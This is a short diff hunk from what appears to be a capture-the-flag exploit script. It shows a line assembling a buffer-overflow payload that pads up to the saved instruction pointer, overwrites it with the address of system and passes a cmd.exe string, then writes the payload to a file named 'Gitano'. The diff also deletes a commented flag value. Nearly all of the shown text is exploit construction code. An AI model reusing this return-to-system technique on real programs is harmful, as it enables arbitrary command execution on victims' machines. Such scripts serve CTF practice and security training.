@@ -86,4 +86,4 @@ buf+=file_pointer+padding_to_eip+system+'\xa1\x18\x40\x00'+Cmd_exe+StringCmdexe
 with open("Gitano","wb") as f:
     f.write(buf)
 
-#####FLAG : d8367928154b2c40f6ef93dd022533a7
+
